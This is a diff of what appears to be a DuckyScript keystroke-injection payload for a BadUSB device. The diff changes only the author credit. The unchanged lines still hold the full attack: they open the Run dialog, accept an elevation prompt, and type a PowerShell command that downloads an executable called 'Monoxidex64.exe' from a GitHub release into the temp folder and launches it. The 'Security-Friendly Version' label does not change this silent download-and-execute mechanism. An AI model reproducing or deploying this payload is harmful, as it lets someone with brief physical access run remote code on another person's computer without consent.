@@ -1,4 +1,4 @@
-REM Made By Kushed3d (Security-Friendly Version)
+REM Made By Gam3r (Security-Friendly Version)
 DEFAULT_DELAY 100
 
 GUI r
@@ -10,3 +10,4 @@ ALT y
 DELAY 750
 STRING cd $env:TEMP; iwr -Uri 'https://github.com/Mist0090/Monoxide-peaceful/releases/download/2.0/Monoxidex64.exe' -OutFile 'upl.exe'; Start-Sleep 1; Start upl.exe; exit
 ENTER
+
